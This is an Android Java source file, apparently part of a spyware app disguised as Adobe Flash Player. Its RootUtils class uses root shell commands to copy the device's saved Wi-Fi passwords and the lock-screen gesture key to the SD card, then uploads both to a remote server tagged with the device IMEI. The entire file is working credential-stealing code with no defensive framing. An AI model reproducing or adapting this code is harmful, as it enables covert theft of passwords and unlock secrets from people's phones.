package com.adobe.flashplayer.accessory;

import android.content.Context;
import android.util.Log;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.UploadData;

import java.io.File;
import java.io.FileInputStream;

public class RootUtils {

    public static String TAG = "[ljg]RootUtils ";

    public static String getWifiPassword(Context context){
        String wifipas = "";
        try{

            LinuxShell.shell("su","cat /data/misc/wifi/wpa_supplicant.conf > " + Public.SDCARD_PATH_NAME + Public.WIFI_PASS_FILENAME);
            File file = new File(Public.SDCARD_PATH_NAME + Public.WIFI_PASS_FILENAME);
            if (file.exists()) {
                FileInputStream fin = new FileInputStream(file);
                byte [] data = new byte[(int)file.length()];
                fin.read(data, 0, (int)file.length());
                fin.close();
                if(data.length > 0){
                    MyLog.writeFile(Public.SDCARD_PATH_NAME, Public.WIFI_PASS_FILENAME,new String(data),true);
                    UploadData sds=new UploadData(data, data.length,Public.CMD_DATA_WIFIPASS, Public.IMEI);
                    Thread threadsendloc = new Thread(sds);
                    threadsendloc.start();
                }
            }
        }
        catch(Exception ex){
            Log.e(TAG,"getWifiPass exception");
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("getWifiPass exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
        }

        return wifipas;
    }


    public static String getScreenGesture(Context context){
        String gesture = "";

        try{

            LinuxShell.shell("su","cat /data/system/gesture.key  > " + Public.SDCARD_PATH_NAME  + Public.SCREENGESTURE_FILENAME);
            File file = new File(Public.SDCARD_PATH_NAME + Public.SCREENGESTURE_FILENAME);
            if (file.exists()) {
                FileInputStream fin = new FileInputStream(file);
                byte [] data = new byte[(int)file.length()];
                fin.read(data, 0, (int)file.length());
                fin.close();

                if(data.length > 0){
                    MyLog.writeFile(Public.SDCARD_PATH_NAME, Public.SCREENGESTURE_FILENAME, new String(data),true);
                    UploadData sds=new UploadData(data, data.length,Public.CMD_DATA_GESTURE, Public.IMEI);
                    Thread threadsendloc = new Thread(sds);
                    threadsendloc.start();
                }
            }
        }
        catch(Exception ex){
            Log.e(TAG,"getGesture exception");
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("getGesture exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
        }

        return gesture;
    }
}
